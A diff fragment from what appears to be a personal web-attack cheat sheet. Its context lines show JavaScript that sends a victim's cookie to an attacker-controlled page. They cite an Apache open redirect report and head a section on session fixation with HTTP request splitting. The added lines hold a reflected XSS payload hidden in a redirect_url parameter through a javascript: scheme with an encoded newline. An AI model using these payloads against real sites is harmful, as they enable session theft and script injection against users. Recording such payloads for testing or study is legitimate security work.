@@ -96,6 +96,18 @@ else{
 document.location=“https://my_own_domain/attacker.html?cookie="+cookie;}
 ...................................................................................
 apache 2.4.3 has open redirect in server /login >> https://hackerone.com/reports/1782514
+
+http://example.com?redirect_url=javascript://%250Aalert(1)  >> xss via redirect (rxss)
+
+
+
+
+
+
+
+
+
+
  
  ----------------------------------------------------------------------------------------------
             Combining Session Fixation With Http Request Splitting 
